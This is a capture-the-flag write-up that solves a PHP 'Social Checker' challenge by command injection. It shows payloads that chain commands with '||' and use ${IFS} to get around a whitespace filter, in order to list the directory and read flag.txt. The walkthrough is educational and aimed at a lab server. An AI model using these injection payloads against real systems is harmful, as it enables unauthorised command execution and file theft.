# Social Checker

## Problem Text

_Social Checker - check if your favourite social media site is online!_

```text
http://46.101.107.117:2103
```

___
Social Checker is a challenge that requires participants to exploit a PHP web application running on a server.

Upon first loading the link, we are taken to a web page with a drop down menu to select a given site to check.

Let's look at the HTML:

```html
<body>
    <h1>Social Checker</h1>
    Check if your favourite social media site is online!<br/><br/>
    <select id="url">
      <option value="twitter.com">twitter.com</option>
      <option value="facebook.com">facebook.com</option>
      <option value="linkedin.com">linkedin.com</option>
      <option value="instagram.com">instagram.com</option>
      <option value="pinterest.com">pinterest.com</option>
      <option value="tumblr.com">tumblr.com</option>
      <option value="wechat.com">wechat.com</option>
      <option value="whatsapp.com">whatsapp.com</option>
    </select><br/><br/>
    <input id="submit" type="submit" value="Check it!" onclick="javascript:doCheck();"/><br/><br/>
    <div class="box" id="result"></div>
</body>
```

From this, we can see that when the select button is clicked, it calls a JavaScript `doCheck()` function embedded in the HTML. This function is defined earlier in the source:

```javascript
function doCheck() {
    $.post("check.php", {"url": $("#url").val()}, function(data) {
    $("#result").text(data);
    });
}
```

Turns out this function is just a stub that sends a POST request to a PHP program that actually does the heavy lifting. This function also sends the selected url inside the POST data.

One of the many techniques that a hacker can use when exploiting a PHP script is command injection. PHP scripts often call system shell commands and pipe their input back for processing before sending it back to the user. These system commands are called using the `system()` function much like in C. This function accepts shell syntax, which means if the input is not sanitized before being passed to `system`, we can inject our commands by using shell syntax to chain the commands together.

We can inject these commands through the url field in the POST data, which can be done by playing around with the browser dev tools (I use Firefox). When we look at the request payload, we see this:

`url=twitter.com`

The JavaScipt function directly sends the url to be checked as a raw string. This means we can manipulate the string being sent and see what happens. Let's try sending something invalid. The script should blindly substitute it in and whatever shell command it runs will throw back an error, then we can see what the PHP script is using to check the sites.

```text
url=ls
```

So here instead of sending a URL, we send a shell command. We get this response:

```text
nc: bad address 'ls'
```

Aha! Turns out this PHP script uses netcat to check the site availability. Since we know that `system()` accepts valid shell syntax, let's try to chain commands together. We send this:

```text
url=; ls
```

Here we assume that the string passed to `system()` becomes `nc; ls`.
Since `nc` fails due to invalid input, `ls` gets executed instead and its output gets sent back to us.

We get this response:

```text
nice try - www.youtube.com/watch?v=a4eav7dFvc8
```

:(

Alright, it looks like the script is filtering out certain characters, so we need to find a workaround. Since `nc` fails, instead of using unconditional chaining, we can use the Bash OR operator. This is used to chain commands together, and causes the second command to be executed only if the first command fails. For example:

```text
$ rm thisfiledoesnotexist.txt || echo "Hi!"

rm: cannot remove 'thisfiledoesnotexist.txt': No such file or directory
Hi!

$ touch thisfilenowexists.txt || echo "Hi!"
# no output because the first command succeeded
```

So, the string we send is now this:

```text
url=instagra || ls
```

This should resolve to `nc instagra || ls` as the string passed to `system()`, so that when the first command fails, `ls` gets executed.

And this was the response:

```text
nice try - www.youtube.com/watch?v=a4eav7dFvc8
```

D:<

Alright, so it looks like either whitespace or the pipe character is also banned. Let's try it without whitespace and see what happens:

We send:

```text
url=instagra||ls
```

And we get this response:

```text
ls: 80: no such file or directory
```

Nice! Pipe characters are accepted. Also it turns out the PHP script adds the port number after the input (port 80), so `ls` took that as one of its arguments. This means we have to pass `ls` the directory as an explicit argument.

But now we have a problem. Whitespace is the main separator for command line arguments, and without it we cannot send the correct commands.

This is where shell syntax comes in handy once again. Bash has an inbuilt variable called IFS, which is used internally by the shell to split a raw input string into commands and arguments. This can be invoked by the user like any other variable. By default, this variable is a whitespace character.

So, this means this sort of thing can work:

```text
$ echo${IFS}hello

hello
```

This means that we can send a string that doesn't contain any whitespace and thus won't get rejected by the script, but when the command gets passed to Bash via `system()`, it still gets split correctly. Let's give it a try:

```text
url=insta||ls${IFS}$PWD
```

Breakdown:

- insta - Send a string that causes `nc` to fail
- `||` - Since `nc` fails, chain the command we want to execute using the condtional operator
- `ls` - the `ls` command
- `${IFS}` - the IFS variable to allow Bash to separate the arguments correctly
- `$PWD` - The present working directory

We get this response:

```text
ls: 80: No such file or directory
/htdocs:
bg.jpg
check.php
flag.txt
index.php
```

Boom! We now know the contents of the directory, and the file is staring at us right in the face. All we have to do now is send the correct command:

```text
url=insta||cat${IFS}flag.txt
```

Response (with error messages removed):

```text
he2021{1ts_fun_t0_1nj3kt_k0mmand5}
```

___
*Flag:* `he2021{1ts_fun_t0_1nj3kt_k0mmand5}`
